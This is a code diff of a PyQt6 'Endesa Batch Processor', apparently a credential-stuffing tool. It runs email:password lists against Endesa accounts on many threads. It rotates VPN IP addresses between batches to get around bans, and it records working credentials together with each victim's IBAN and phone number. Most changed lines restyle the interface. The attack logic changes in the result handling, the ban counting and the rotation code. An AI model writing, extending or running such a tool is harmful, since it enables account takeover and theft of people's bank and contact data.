@@ -11,7 +11,7 @@ from PyQt6.QtWidgets import (
     QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, QWidget, 
     QPushButton, QLabel, QSpinBox, QTextEdit, QProgressBar, 
     QGroupBox, QGridLayout, QFileDialog, QMessageBox, QTabWidget,
-    QTableWidget, QTableWidgetItem, QHeaderView, QCheckBox
+    QTableWidget, QTableWidgetItem, QHeaderView, QCheckBox, QSizePolicy
 )
 from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
 from PyQt6.QtGui import QFont
@@ -87,13 +87,7 @@ class BatchProcessorThread(QThread):
                     # Connect to first VPN location before starting processing
                     self.progress_updated.emit("Connecting to initial VPN location...")
                     if self.vpn_manager.connect_smart():
-                        # Verify initial connection
-                        if self.vpn_manager._verify_connection():
-                            initial_ip = self.vpn_manager.get_current_ip()
-                            self.progress_updated.emit(f"Initial VPN connection established - IP: {initial_ip}")
-                        else:
-                            self.progress_updated.emit("Initial VPN connection verification failed, continuing without VPN")
-                            self.use_vpn = False
+                        self.progress_updated.emit("Initial VPN connection established")
                     else:
                         self.progress_updated.emit("Initial VPN connection failed, continuing without VPN")
                         self.use_vpn = False
@@ -104,7 +98,7 @@ class BatchProcessorThread(QThread):
             
             # Process all credentials continuously without waiting for batch completion
             if self.use_vpn:
-                # VPN mode: Process batch -> Wait completion -> Rotate IP -> Start next batch immediately
+                # VPN mode: Process in batches with IP rotation
                 remaining_credentials = credentials.copy()
                 batch_count = 0
                 
@@ -117,7 +111,15 @@ class BatchProcessorThread(QThread):
                     batch_count += 1
                     self.progress_updated.emit(f"Processing batch {batch_count} of {batch_size} credentials...")
                     
-                    # Process current batch and wait for completion
+                    # Rotate IP if not the first batch
+                    if batch_count > 1:
+                        self.progress_updated.emit("Rotating IP for next batch...")
+                        if self.vpn_manager.rotate_ip():
+                            self.progress_updated.emit("IP rotated successfully")
+                        else:
+                            self.progress_updated.emit("IP rotation failed, continuing with current IP")
+                    
+                    # Process current batch and wait for completion (VPN mode)
                     batch_results = self._process_batch(current_batch)
                     
                     # Update statistics
@@ -126,6 +128,10 @@ class BatchProcessorThread(QThread):
                             successful += 1
                         elif result_type == "BANNED":
                             banned += 1
+                        elif result_type == "INVALID":
+                            failed += 1  # Count invalid as failed
+                        elif result_type == "NO_DATA":
+                            successful += 1  # Count no data as success (since we write it to file)
                         else:  # FAILED
                             failed += 1
                     
@@ -139,17 +145,6 @@ class BatchProcessorThread(QThread):
                     rate = current_total / elapsed_time if elapsed_time > 0 else 0
                     self.stats_updated.emit(successful, failed, banned, current_total, rate)
                     self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
-                    
-                    # Rotate IP if there are more credentials to process
-                    if remaining_credentials and self.running:
-                        self.progress_updated.emit("Batch completed. Rotating IP...")
-                        start_rotation = time.time()
-                        
-                        if self.vpn_manager.rotate_ip():
-                            rotation_time = time.time() - start_rotation
-                            self.progress_updated.emit(f"IP rotation completed in {rotation_time:.1f}s")
-                        else:
-                            self.progress_updated.emit("IP rotation failed, continuing with current IP")
             else:
                 # Normal mode: Process all credentials continuously without waiting
                 self.progress_updated.emit("Starting continuous processing (normal mode)...")
@@ -179,8 +174,8 @@ class BatchProcessorThread(QThread):
                                 result, result_type = future.result(timeout=0.1)  # Non-blocking
                                 email, line_num = future_to_credential[future]
                                 
-                                # Write result immediately to file (write everything except login failures)
-                                if not result.startswith("LOGIN_FAILED"):
+                                # Write result immediately to file (only write SUCCESS and NO_DATA)
+                                if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
                                     self._write_result_to_file(result)
                                 
                                 # Emit the actual result message first (for parsing)
@@ -191,6 +186,10 @@ class BatchProcessorThread(QThread):
                                     successful += 1
                                 elif result_type == "BANNED":
                                     banned += 1
+                                elif result_type == "INVALID":
+                                    failed += 1  # Count invalid as failed
+                                elif result_type == "NO_DATA":
+                                    successful += 1  # Count no data as success (since we write it to file)
                                 else:  # FAILED
                                     failed += 1
                                 
@@ -277,8 +276,8 @@ class BatchProcessorThread(QThread):
                         result, result_type = future.result(timeout=0.1)  # Non-blocking
                         email, line_num = future_to_credential[future]
                         
-                        # Write result immediately to file (write everything except login failures)
-                        if not result.startswith("LOGIN_FAILED"):
+                        # Write result immediately to file (only write SUCCESS and NO_DATA)
+                        if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
                             self._write_result_to_file(result)
                         
                         # Emit the actual result message first (for parsing)
@@ -331,10 +330,11 @@ class BatchProcessorThread(QThread):
                 if "BANNED:" in error_msg:
                     result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                     return result, "BANNED"
-                # Check for specific login failures - don't write these to file
-                elif "invalid username" in error_msg.lower() or "usuario o la contraseña son incorrectos" in error_msg.lower():
-                    result = f"LOGIN_FAILED: Line {line_num} - {email} - Invalid credentials"
-                    return result, "FAILED"  # Count as failed but don't write to file
+                # Check for specific "Invalid URL '/sites/Satellite'" error - this is the only one we count as invalid
+                elif "invalid url '/sites/satellite'" in error_msg.lower():
+                    result = f"INVALID: Line {line_num} - {email} - Invalid URL Satellite"
+                    return result, "INVALID"
+                # All other login failures - don't write these to file
                 else:
                     result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
                     return result, "FAILED"  # Count as failed but don't write to file
@@ -354,6 +354,10 @@ class BatchProcessorThread(QThread):
                     if "BANNED:" in error_msg:
                         result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                         return result, "BANNED"
+                    # Check for "no retrieve data" cases - write these to file
+                    elif "no retrieve data" in error_msg.lower() or "data not found" in error_msg.lower():
+                        result = f"NO_DATA: Line {line_num} - {email}:{password} - No data retrieved"
+                        return result, "NO_DATA"
                     else:
                         result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
                         return result, "FAILED"
@@ -395,8 +399,12 @@ class EndesaInterface(QMainWindow):
     def init_ui(self):
         """Initialize the user interface."""
         self.setWindowTitle("Endesa Batch Processor")
-        self.setGeometry(100, 100, 1200, 900)  # Larger window for big datasets
-        self.setMinimumSize(1000, 700)
+        # More responsive window sizing
+        screen = QApplication.primaryScreen().geometry()
+        window_width = min(1200, screen.width() - 100)
+        window_height = min(900, screen.height() - 100)
+        self.setGeometry(100, 100, window_width, window_height)
+        self.setMinimumSize(800, 600)  # Smaller minimum for smaller screens
         
         # Set modern dark theme styling
         self.setStyleSheet("""
@@ -427,10 +435,10 @@ class EndesaInterface(QMainWindow):
                 background-color: #00b4d8;
                 color: white;
                 border: none;
-                padding: 10px 20px;
+                padding: 8px 16px;
                 border-radius: 6px;
                 font-weight: bold;
-                font-size: 14px;
+                font-size: 12px;
             }
             QPushButton:hover {
                 background-color: #0096c7;
@@ -443,12 +451,12 @@ class EndesaInterface(QMainWindow):
                 color: #666666;
             }
             QSpinBox {
-                padding: 8px;
+                padding: 6px;
                 border: 2px solid #404040;
                 border-radius: 6px;
                 background-color: #1e1e1e;
                 color: #ffffff;
-                font-size: 14px;
+                font-size: 12px;
             }
             QSpinBox:focus {
                 border: 2px solid #00b4d8;
@@ -467,8 +475,8 @@ class EndesaInterface(QMainWindow):
                 background-color: #1e1e1e;
                 color: #ffffff;
                 font-family: 'Consolas', 'Monaco', monospace;
-                font-size: 11px;
-                padding: 8px;
+                font-size: 10px;
+                padding: 6px;
             }
             QTextEdit:focus {
                 border: 2px solid #00b4d8;
@@ -488,15 +496,15 @@ class EndesaInterface(QMainWindow):
             }
             QLabel {
                 color: #ffffff;
-                font-size: 14px;
+                font-size: 12px;
             }
             QLineEdit {
-                padding: 8px;
+                padding: 6px;
                 border: 2px solid #404040;
                 border-radius: 6px;
                 background-color: #1e1e1e;
                 color: #ffffff;
-                font-size: 14px;
+                font-size: 12px;
             }
             QLineEdit:focus {
                 border: 2px solid #00b4d8;
@@ -511,23 +519,39 @@ class EndesaInterface(QMainWindow):
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         
-        # Main layout
-        layout = QVBoxLayout(central_widget)
-        layout.setSpacing(15)
-        layout.setContentsMargins(20, 20, 20, 20)
+        # Main layout - Use QHBoxLayout for better space distribution
+        main_layout = QHBoxLayout(central_widget)
+        main_layout.setSpacing(15)
+        main_layout.setContentsMargins(15, 15, 15, 15)
+        
+        # Left panel for configuration and controls (40% width)
+        left_panel = QWidget()
+        left_panel.setMaximumWidth(500)
+        left_panel.setMinimumWidth(450)
+        left_layout = QVBoxLayout(left_panel)
+        left_layout.setSpacing(15)  # Consistent spacing between sections
+        left_layout.setContentsMargins(0, 0, 0, 0)
+        
+        # Right panel for results (70% width)
+        right_panel = QWidget()
+        right_layout = QVBoxLayout(right_panel)
+        right_layout.setSpacing(10)
+        right_layout.setContentsMargins(0, 0, 0, 0)
         
         # Title
         title_label = QLabel("Endesa Batch Processor")
-        title_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))
+        # Smaller, more appropriate font size
+        font_size = min(16, max(12, int(window_width / 80)))
+        title_label.setFont(QFont("Arial", font_size, QFont.Weight.Bold))
         title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        title_label.setStyleSheet("color: #00b4d8; margin-bottom: 10px; font-size: 24px;")
-        layout.addWidget(title_label)
+        title_label.setStyleSheet(f"color: #00b4d8; margin-bottom: 10px; font-size: {font_size}px; padding: 8px;")
+        left_layout.addWidget(title_label)
         
-        # Configuration group - Clean and simple
+        # Configuration group - Clean styling
         config_group = QGroupBox("⚙️ Configuration")
         config_group.setStyleSheet("""
             QGroupBox {
-                border: 1px solid #404040;
+                border: 2px solid #404040;
                 border-radius: 8px;
                 margin-top: 1ex;
                 padding-top: 15px;
@@ -536,42 +560,42 @@ class EndesaInterface(QMainWindow):
             }
             QGroupBox::title {
                 subcontrol-origin: margin;
-                left: 10px;
+                left: 15px;
                 padding: 0 8px 0 8px;
                 color: #00b4d8;
-                font-size: 14px;
+                font-size: 13px;
                 font-weight: bold;
             }
         """)
         config_layout = QGridLayout(config_group)
-        config_layout.setSpacing(15)
-        config_layout.setContentsMargins(20, 20, 20, 20)
+        config_layout.setSpacing(12)  # Tighter spacing for better fit
+        config_layout.setContentsMargins(15, 15, 15, 15)
         
         # Credentials file selection - Row 0
         self.credentials_label = QLabel("📁 Credentials File:")
-        self.credentials_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
+        self.credentials_label.setStyleSheet("color: #ffffff; font-size: 12px; font-weight: bold; padding: 8px 0px;")
         
         self.credentials_path_label = QLabel("No file selected")
         self.credentials_path_label.setStyleSheet("""
             color: #888888; 
             font-style: italic; 
-            padding: 8px 12px; 
+            padding: 6px 8px; 
             border: 1px solid #505050; 
             border-radius: 4px; 
-            background-color: #1e1e1e;
-            font-size: 11px;
+            background-color: transparent;
+            font-size: 10px;
         """)
         
         self.browse_button = QPushButton("Browse")
-        self.browse_button.setMinimumWidth(80)
-        self.browse_button.setMinimumHeight(32)
+        self.browse_button.setMinimumWidth(70)
+        self.browse_button.setMinimumHeight(30)
         self.browse_button.clicked.connect(self.browse_credentials_directory)
         self.browse_button.setStyleSheet("""
             QPushButton {
                 background-color: #00b4d8;
                 color: white;
                 border: none;
-                padding: 8px 15px;
+                padding: 8px 16px;
                 border-radius: 4px;
                 font-weight: bold;
                 font-size: 11px;
@@ -590,21 +614,21 @@ class EndesaInterface(QMainWindow):
         
         # Thread count selection - Row 1
         self.threads_label = QLabel("⚡ Thread Count:")
-        self.threads_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
+        self.threads_label.setStyleSheet("color: #ffffff; font-size: 12px; font-weight: bold; padding: 8px 0px;")
         
         self.threads_spinbox = QSpinBox()
         self.threads_spinbox.setRange(1, 200)
         self.threads_spinbox.setValue(50)
         self.threads_spinbox.setMinimumWidth(100)
-        self.threads_spinbox.setMinimumHeight(32)
+        self.threads_spinbox.setMinimumHeight(30)
         self.threads_spinbox.setStyleSheet("""
             QSpinBox {
-                padding: 6px 10px;
+                padding: 8px 12px;
                 border: 1px solid #505050;
                 border-radius: 4px;
                 background-color: #1e1e1e;
                 color: #ffffff;
-                font-size: 11px;
+                font-size: 12px;
             }
             QSpinBox:focus {
                 border: 1px solid #00b4d8;
@@ -613,8 +637,8 @@ class EndesaInterface(QMainWindow):
                 background-color: #404040;
                 border: none;
                 border-radius: 2px;
-                width: 16px;
-                height: 12px;
+                width: 18px;
+                height: 14px;
                 margin: 1px;
             }
             QSpinBox::up-button:hover, QSpinBox::down-button:hover {
@@ -627,25 +651,25 @@ class EndesaInterface(QMainWindow):
         
         # Retry configuration - Row 2
         self.retry_label = QLabel("🔄 Retry Settings:")
-        self.retry_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
+        self.retry_label.setStyleSheet("color: #ffffff; font-size: 12px; font-weight: bold; padding: 8px 0px;")
         
         retry_container = QWidget()
         retry_layout = QHBoxLayout(retry_container)
-        retry_layout.setSpacing(15)
+        retry_layout.setSpacing(10)
         retry_layout.setContentsMargins(0, 0, 0, 0)
         
         # Max retries
         retry_attempts_label = QLabel("Max Retries:")
-        retry_attempts_label.setStyleSheet("color: #888888; font-size: 11px;")
+        retry_attempts_label.setStyleSheet("color: #888888; font-size: 11px; padding: 8px 0px;")
         
         self.retry_attempts_spinbox = QSpinBox()
         self.retry_attempts_spinbox.setRange(1, 10)
         self.retry_attempts_spinbox.setValue(3)
-        self.retry_attempts_spinbox.setMinimumWidth(80)
-        self.retry_attempts_spinbox.setMinimumHeight(32)
+        self.retry_attempts_spinbox.setMinimumWidth(60)
+        self.retry_attempts_spinbox.setMinimumHeight(30)
         self.retry_attempts_spinbox.setStyleSheet("""
             QSpinBox {
-                padding: 6px 10px;
+                padding: 8px 12px;
                 border: 1px solid #505050;
                 border-radius: 4px;
                 background-color: #1e1e1e;
@@ -670,16 +694,16 @@ class EndesaInterface(QMainWindow):
         
         # Base delay
         retry_delay_label = QLabel("Base Delay (s):")
-        retry_delay_label.setStyleSheet("color: #888888; font-size: 11px;")
+        retry_delay_label.setStyleSheet("color: #888888; font-size: 11px; padding: 8px 0px;")
         
         self.retry_delay_spinbox = QSpinBox()
         self.retry_delay_spinbox.setRange(1, 30)
         self.retry_delay_spinbox.setValue(2)
-        self.retry_delay_spinbox.setMinimumWidth(80)
-        self.retry_delay_spinbox.setMinimumHeight(32)
+        self.retry_delay_spinbox.setMinimumWidth(60)
+        self.retry_delay_spinbox.setMinimumHeight(30)
         self.retry_delay_spinbox.setStyleSheet("""
             QSpinBox {
-                padding: 6px 10px;
+                padding: 8px 12px;
                 border: 1px solid #505050;
                 border-radius: 4px;
                 background-color: #1e1e1e;
@@ -713,7 +737,7 @@ class EndesaInterface(QMainWindow):
         
         # VPN checkbox - Row 3
         self.vpn_label = QLabel("🌐 VPN:")
-        self.vpn_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
+        self.vpn_label.setStyleSheet("color: #ffffff; font-size: 12px; font-weight: bold; padding: 8px 0px;")
         
         # Create a container for VPN with better visual feedback
         vpn_container = QWidget()
@@ -721,7 +745,7 @@ class EndesaInterface(QMainWindow):
         vpn_layout.setSpacing(10)
         vpn_layout.setContentsMargins(0, 0, 0, 0)
         
-        self.vpn_checkbox = QCheckBox("Enable IP rotation between batches")
+        self.vpn_checkbox = QCheckBox("Enable IP rotation")
         self.vpn_checkbox.setChecked(False)
         self.vpn_checkbox.setStyleSheet("""
             QCheckBox {
@@ -729,10 +753,10 @@ class EndesaInterface(QMainWindow):
                 font-size: 11px;
             }
             QCheckBox::indicator {
-                width: 20px;
-                height: 20px;
+                width: 18px;
+                height: 18px;
                 border: 2px solid #505050;
-                border-radius: 5px;
+                border-radius: 4px;
                 background-color: #1e1e1e;
             }
             QCheckBox::indicator:checked {
@@ -757,12 +781,12 @@ class EndesaInterface(QMainWindow):
         self.vpn_status_indicator = QLabel("❌ Disabled")
         self.vpn_status_indicator.setStyleSheet("""
             color: #ff6b6b;
-            font-size: 10px;
+            font-size: 9px;
             font-weight: bold;
-            padding: 4px 8px;
+            padding: 3px 6px;
             border: 1px solid #ff6b6b;
             border-radius: 3px;
-            background-color: rgba(255, 107, 107, 0.1);
+            background-color: transparent;
         """)
         
         # Connect checkbox to update status indicator
@@ -775,52 +799,49 @@ class EndesaInterface(QMainWindow):
         config_layout.addWidget(self.vpn_label, 3, 0)
         config_layout.addWidget(vpn_container, 3, 1, 1, 2)
         
-        layout.addWidget(config_group)
+        left_layout.addWidget(config_group)
         
         # Control group
-        control_group = QGroupBox("Controls")
+        control_group = QGroupBox("🎮 Controls")
         control_group.setStyleSheet("""
             QGroupBox {
                 font-weight: bold;
                 border: 2px solid #404040;
                 border-radius: 8px;
                 margin-top: 1ex;
-                padding-top: 10px;
-                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
-                    stop:0 #2d2d2d, stop:1 #1e1e1e);
+                padding-top: 15px;
+                background-color: transparent;
                 color: #ffffff;
             }
             QGroupBox::title {
                 subcontrol-origin: margin;
-                left: 10px;
+                left: 15px;
                 padding: 0 8px 0 8px;
                 color: #00b4d8;
-                font-size: 14px;
+                font-size: 13px;
                 font-weight: bold;
             }
         """)
         control_layout = QHBoxLayout(control_group)
-        control_layout.setSpacing(15)
+        control_layout.setSpacing(10)
         control_layout.setContentsMargins(15, 15, 15, 15)
         
         # Control buttons container
         control_buttons = QWidget()
         control_buttons.setStyleSheet("""
             QWidget {
-                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
-                    stop:0 #3a3a3a, stop:1 #2a2a2a);
-                border: 1px solid #505050;
-                border-radius: 6px;
-                padding: 12px;
+                background-color: transparent;
+                border: none;
+                padding: 10px;
             }
         """)
         control_buttons_layout = QHBoxLayout(control_buttons)
-        control_buttons_layout.setSpacing(15)
-        control_buttons_layout.setContentsMargins(12, 12, 12, 12)
+        control_buttons_layout.setSpacing(10)
+        control_buttons_layout.setContentsMargins(10, 10, 10, 10)
         
         self.start_button = QPushButton("▶ Start Processing")
         self.start_button.clicked.connect(self.start_processing)
-        self.start_button.setMinimumHeight(45)
+        self.start_button.setMinimumHeight(35)
         self.start_button.setStyleSheet("""
             QPushButton {
                 background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
@@ -850,7 +871,7 @@ class EndesaInterface(QMainWindow):
         self.stop_button = QPushButton("⏹ Stop Processing")
         self.stop_button.clicked.connect(self.stop_processing)
         self.stop_button.setEnabled(False)
-        self.stop_button.setMinimumHeight(45)
+        self.stop_button.setMinimumHeight(35)
         self.stop_button.setStyleSheet("""
             QPushButton {
                 background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
@@ -882,56 +903,78 @@ class EndesaInterface(QMainWindow):
         
         control_layout.addWidget(control_buttons)
         
-        layout.addWidget(control_group)
+        left_layout.addWidget(control_group)
         
         # Progress group
-        progress_group = QGroupBox("Progress & Statistics")
+        progress_group = QGroupBox("📊 Progress & Statistics")
+        progress_group.setStyleSheet("""
+            QGroupBox {
+                font-weight: bold;
+                border: 2px solid #404040;
+                border-radius: 8px;
+                margin-top: 1ex;
+                padding-top: 15px;
+                background-color: transparent;
+                color: #ffffff;
+            }
+            QGroupBox::title {
+                subcontrol-origin: margin;
+                left: 15px;
+                padding: 0 8px 0 8px;
+                color: #00b4d8;
+                font-size: 13px;
+                font-weight: bold;
+            }
+        """)
         progress_layout = QVBoxLayout(progress_group)
-        progress_layout.setSpacing(10)
+        progress_layout.setSpacing(12)
+        progress_layout.setContentsMargins(15, 15, 15, 15)
         
         # Status and progress
         self.status_label = QLabel("Ready to start")
-        self.status_label.setStyleSheet("color: #888888; font-size: 14px; padding: 5px;")
+        self.status_label.setStyleSheet("color: #888888; font-size: 12px; padding: 8px; font-weight: bold;")
         
         self.progress_bar = QProgressBar()
         self.progress_bar.setVisible(False)
         
-        # Statistics panel
-        stats_layout = QHBoxLayout()
+        # Statistics panel - More compact layout
+        stats_layout = QGridLayout()
+        stats_layout.setSpacing(6)
         
         # Success counter
         self.success_label = QLabel("Success: 0")
-        self.success_label.setStyleSheet("color: #00ff00; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #00ff00; border-radius: 6px; background-color: #1e1e1e;")
+        self.success_label.setStyleSheet("color: #00ff00; font-size: 12px; font-weight: bold; padding: 6px; border: 1px solid #00ff00; border-radius: 4px; background-color: transparent;")
         
         # Failure counter
         self.failure_label = QLabel("Failed: 0")
-        self.failure_label.setStyleSheet("color: #ff4444; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #ff4444; border-radius: 6px; background-color: #1e1e1e;")
+        self.failure_label.setStyleSheet("color: #ff4444; font-size: 12px; font-weight: bold; padding: 6px; border: 1px solid #ff4444; border-radius: 4px; background-color: transparent;")
         
         # Banned counter
         self.banned_label = QLabel("Banned: 0")
-        self.banned_label.setStyleSheet("color: #ff8800; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #ff8800; border-radius: 6px; background-color: #1e1e1e;")
+        self.banned_label.setStyleSheet("color: #ff8800; font-size: 12px; font-weight: bold; padding: 6px; border: 1px solid #ff8800; border-radius: 4px; background-color: transparent;")
         
         # Total counter
         self.total_label = QLabel("Total: 0")
-        self.total_label.setStyleSheet("color: #00b4d8; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #00b4d8; border-radius: 6px; background-color: #1e1e1e;")
+        self.total_label.setStyleSheet("color: #00b4d8; font-size: 12px; font-weight: bold; padding: 6px; border: 1px solid #00b4d8; border-radius: 4px; background-color: transparent;")
         
         # Rate counter
         self.rate_label = QLabel("Rate: 0 req/s")
-        self.rate_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold; padding: 10px; border: 2px solid #404040; border-radius: 6px; background-color: #2d2d2d;")
+        self.rate_label.setStyleSheet("color: #ffffff; font-size: 11px; font-weight: bold; padding: 6px; border: 1px solid #404040; border-radius: 4px; background-color: transparent;")
         
-        stats_layout.addWidget(self.success_label)
-        stats_layout.addWidget(self.failure_label)
-        stats_layout.addWidget(self.banned_label)
-        stats_layout.addWidget(self.total_label)
-        stats_layout.addWidget(self.rate_label)
+        # Arrange statistics in a 2x3 grid for better space usage
+        stats_layout.addWidget(self.success_label, 0, 0)
+        stats_layout.addWidget(self.failure_label, 0, 1)
+        stats_layout.addWidget(self.banned_label, 0, 2)
+        stats_layout.addWidget(self.total_label, 1, 0)
+        stats_layout.addWidget(self.rate_label, 1, 1)
         
         progress_layout.addWidget(self.status_label)
         progress_layout.addWidget(self.progress_bar)
         progress_layout.addLayout(stats_layout)
         
-        layout.addWidget(progress_group)
+        left_layout.addWidget(progress_group)
         
-        # Output group with tabbed interface
+        # Output group with tabbed interface - Move to right panel
         output_group = QGroupBox("Results")
         output_layout = QVBoxLayout(output_group)
         
@@ -960,6 +1003,9 @@ class EndesaInterface(QMainWindow):
                 background-color: #505050;
             }
         """)
+        
+        # Make tab widget stretch to fill available space
+        self.tab_widget.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
         
         # Output Log Tab
         output_tab = QWidget()
@@ -994,10 +1040,10 @@ class EndesaInterface(QMainWindow):
         
         output_tab_layout.addLayout(output_controls_layout)
         
-        # Output text area
+        # Output text area - Responsive sizing
         self.output_text = QTextEdit()
         self.output_text.setReadOnly(True)
-        self.output_text.setMinimumHeight(300)
+        self.output_text.setMinimumHeight(500)  # Much bigger minimum height
         self.output_text.setStyleSheet("""
             QTextEdit {
                 border: 2px solid #404040;
@@ -1010,6 +1056,9 @@ class EndesaInterface(QMainWindow):
             }
         """)
         self.output_text.setAcceptRichText(True)
+        
+        # Make output text stretch to fill available space
+        self.output_text.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
         
         # Initialize output management
         self.output_lines = []
@@ -1050,10 +1099,11 @@ class EndesaInterface(QMainWindow):
         
         table_tab_layout.addLayout(table_controls_layout)
         
-        # Success table
+        # Success table - Responsive sizing
         self.success_table = QTableWidget()
         self.success_table.setColumnCount(5)
         self.success_table.setHorizontalHeaderLabels(["Line", "Email", "Password", "IBAN", "Phone"])
+        self.success_table.setMinimumHeight(500)  # Much bigger minimum height
         self.success_table.setStyleSheet("""
             QTableWidget {
                 border: 2px solid #404040;
@@ -1074,41 +1124,41 @@ class EndesaInterface(QMainWindow):
             QHeaderView::section {
                 background-color: #2d2d2d;
                 color: #ffffff;
-                padding: 10px;
+                padding: 8px;
                 border: none;
                 border-bottom: 2px solid #404040;
                 font-weight: bold;
             }
-            QHeaderView::section:hover {
-                background-color: #404040;
-            }
         """)
         
-        # Set table properties
-        header = self.success_table.horizontalHeader()
-        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)  # Line
-        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)  # Email
-        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)  # Password
-        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)  # IBAN
-        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)  # Phone
+        # Set responsive column widths that adapt to table size
+        self.success_table.horizontalHeader().setStretchLastSection(False)
+        self.success_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)  # Line - fixed width
+        self.success_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)  # Email - stretch
+        self.success_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)  # Password - stretch
+        self.success_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)  # IBAN - stretch
+        self.success_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)  # Phone - stretch
         
-        self.success_table.setMinimumHeight(300)
-        self.success_table.setAlternatingRowColors(True)
-        self.success_table.setRowCount(0)  # Start with 0 rows
-        self.success_table.verticalHeader().setVisible(True)  # Show row numbers
+        # Set initial column widths (will be overridden by stretch mode)
+        self.success_table.setColumnWidth(0, 60)   # Line - fixed width
         
-        # Initialize success data storage
-        self.success_data = []
+        # Make table stretch to fill available space
+        self.success_table.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
         
         table_tab_layout.addWidget(self.success_table)
         
         # Add tabs to tab widget
-        self.tab_widget.addTab(output_tab, "Output Log")
-        self.tab_widget.addTab(table_tab, "Success Table")
+        self.tab_widget.addTab(output_tab, "📋 Output Log")
+        self.tab_widget.addTab(table_tab, "✅ Success Table")
         
         output_layout.addWidget(self.tab_widget)
         
-        layout.addWidget(output_group)
+        # Add panels to main layout
+        right_layout.addWidget(output_group)
+        
+        # Add left and right panels to main layout
+        main_layout.addWidget(left_panel)
+        main_layout.addWidget(right_panel)
         
         # Set default credentials file if it exists
         if os.path.exists("credentials.txt"):
@@ -1119,7 +1169,7 @@ class EndesaInterface(QMainWindow):
                 padding: 12px 16px; 
                 border: 2px solid #00b4d8; 
                 border-radius: 6px; 
-                background-color: #2d2d2d;
+                background-color: transparent;
                 font-size: 13px;
             """)
     
@@ -1165,8 +1215,7 @@ class EndesaInterface(QMainWindow):
                 padding: 8px 12px; 
                 border: 2px solid #00b4d8; 
                 border-radius: 6px; 
-                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
-                    stop:0 #2d2d2d, stop:1 #1e1e1e);
+                background-color: transparent;
                 font-size: 11px;
                 min-height: 35px;
             """)
@@ -1358,8 +1407,41 @@ class EndesaInterface(QMainWindow):
                 # If parsing fails, just continue with normal output
                 pass
                 
+        elif message.startswith("NO_DATA"):
+            colored_message = f'<span style="color: #ffff00;">{message}</span>'  # Yellow for no data
+            
+            # Parse no data message and add to table
+            try:
+                # Format: "NO_DATA: Line X - email:password - No data retrieved"
+                parts = message.split(" - ")
+                
+                if len(parts) >= 2:
+                    line_part = parts[0].replace("NO_DATA: Line ", "")
+                    credentials_part = parts[1]
+                    
+                    # Extract line number
+                    line_num = line_part.strip()
+                    
+                    # Extract email and password
+                    if ':' in credentials_part:
+                        email, password = credentials_part.split(':', 1)
+                        email = email.strip()
+                        password = password.strip()
+                    else:
+                        email = credentials_part.strip()
+                        password = ""
+                    
+                    # Add to success table with "No Data" for IBAN and phone
+                    self.add_success_to_table(line_num, email, password, "No Data", "No Data")
+                    
+            except Exception as e:
+                # If parsing fails, just continue with normal output
+                pass
+                
         elif message.startswith("ERROR"):
             colored_message = f'<span style="color: #ff4444;">{message}</span>'
+        elif message.startswith("INVALID"):
+            colored_message = f'<span style="color: #ff0000;">{message}</span>'  # Red for invalid URL satellite
         elif message.startswith("LOGIN_FAILED"):
             colored_message = f'<span style="color: #ffa500;">{message}</span>'  # Orange for login failures
         elif message.startswith("BANNED"):
